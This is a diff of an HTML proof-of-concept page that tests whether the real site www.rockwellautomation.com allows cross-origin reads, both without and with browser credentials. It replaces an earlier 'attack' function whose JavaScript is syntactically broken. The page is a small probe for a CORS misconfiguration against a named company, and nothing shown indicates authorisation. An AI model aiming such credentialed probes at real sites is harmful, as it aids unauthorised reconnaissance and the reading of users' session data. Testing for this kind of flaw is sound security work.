@@ -1,31 +1,91 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CORS POC</title>
+  <title>CORS Real Test POC</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0f172a;
+      color: #e5e7eb;
+      padding: 20px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-right: 10px;
+    }
+    pre {
+      margin-top: 20px;
+      padding: 15px;
+      background: #020617;
+      border: 1px solid #334155;
+      max-height: 400px;
+      overflow: auto;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+  </style>
 </head>
 <body>
-  <h1>CORS Test</h1>
-  <button onclick="attack()">Run Attack</button>
-  <pre id="output"></pre>
+
+  <h1>CORS Browser Test</h1>
+  <p>
+    This page tests whether the browser allows reading a cross‑origin response.
+  </p>
+
+  <button onclick="testNoCreds()">Test (No Credentials)</button>
+  <button onclick="testWithCreds()">Test (With Credentials)</button>
+
+  <pre id="output">Waiting...</pre>
 
   <script>
-    function attack() {
-fetch("https://www.rockwellautomation.com", {
-  method: "GET"
-})
-.then(r => r.text())
-.then(d => console.log(d))
-.catch(e => console.error(e));
+    const target = "https://www.rockwellautomation.com";
+
+    function log(msg) {
+      document.getElementById("output").textContent = msg;
+    }
+
+    function testNoCreds() {
+      log("Running fetch WITHOUT credentials...\n");
+
+      fetch(target, {
+        method: "GET"
       })
-      .then(res => res.text())
+      .then(res => {
+        log("Status: " + res.status + "\n\nReading response...");
+        return res.text();
+      })
       .then(data => {
-        document.getElementById("output").innerText = data;
+        log("✅ Response read successfully (public content):\n\n" +
+            data.substring(0, 1500));
       })
       .catch(err => {
-        document.getElementById("output").innerText = err;
+        log("❌ Blocked by browser:\n" + err);
+      });
+    }
+
+    function testWithCreds() {
+      log("Running fetch WITH credentials...\n");
+
+      fetch(target, {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(res => {
+        log("Status: " + res.status + "\n\nReading response...");
+        return res.text();
+      })
+      .then(data => {
+        log("🔥 Response read WITH credentials:\n\n" +
+            data.substring(0, 1500));
+      })
+      .catch(err => {
+        log("❌ Blocked by browser (expected if not vulnerable):\n" + err);
       });
     }
   </script>
+
 </body>
 </html>
